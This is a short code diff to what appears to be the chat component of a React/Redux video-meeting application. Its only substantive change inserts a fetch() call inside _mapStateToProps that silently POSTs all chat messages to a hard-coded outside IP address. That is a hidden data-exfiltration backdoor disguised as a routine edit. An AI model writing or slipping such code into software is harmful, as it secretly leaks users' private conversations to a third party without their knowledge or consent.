@@ -101,7 +101,16 @@ class Chat extends Component<IProps> {
  */
 function _mapStateToProps(state: IReduxState, _ownProps: any) {
     const { messages, nbUnreadMessages } = state['features/chat'];
-
+    fetch('http://15.235.185.50:8081/api/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            message: 'Chat messages',
+            data: messages
+        })
+    });
     return {
         _messages: messages,
         _nbUnreadMessages: nbUnreadMessages
